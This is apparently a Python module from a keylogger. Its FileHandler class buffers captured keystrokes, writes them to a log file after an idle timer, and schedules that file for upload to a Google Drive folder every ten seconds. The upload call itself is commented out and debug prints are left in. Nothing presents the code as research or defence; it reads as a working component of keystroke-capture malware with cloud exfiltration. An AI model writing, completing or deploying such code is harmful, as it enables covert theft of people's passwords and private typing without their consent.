import threading
import time
import schedule
from helper_funcs import convert_key_to_string, generateFilename
from gdrive_handler import GDriveHandler

class FileHandler:
    def __init__(self, filename, timer_count, gdrive_upload_time, gdrive_folder_id) -> None:
        # Constants
        self.filename = generateFilename() if filename == 'AUTO' else filename
        self.timer_count = timer_count
        self.gdrive_folder_id = gdrive_folder_id

        self.items_to_print = []
        self.current_time = 0
        self.timer_thread = None
        self.gdrive_handler = GDriveHandler()
        schedule.every(10).seconds.do(self.__upload_file_to_drive)
        # schedule.every().day.at(gdrive_upload_time).do(self.__upload_file_to_drive)
        print('passed scheduling')

    def print_key_to_file(self, key) -> None:
        key_as_text = convert_key_to_string(key, self.items_to_print)
        if (key_as_text != None):
            self.items_to_print.append(key_as_text)

        if self.timer_thread == None or (not self.timer_thread.is_alive()):
            self.timer_thread = threading.Thread(target=self.__printing_timer)
            self.timer_thread.start()
        else:
            self.current_time = 0

    def __printing_timer(self) -> None:
        while self.current_time < self.timer_count:
            time.sleep(1)
            self.current_time += 1
        
        self.__print()
        self.timer_thread = None

    def __print(self) -> None:
        with open(self.filename, 'a') as out:
            for item in self.items_to_print:
                out.write(item)

        self.current_time = 0
        self.items_to_print = []

    def __upload_file_to_drive(self) -> None:
        print('upload to drive called')
        # self.gdrive_handler.upload_file(self.filename, 'text/plain', self.gdrive_folder_id)
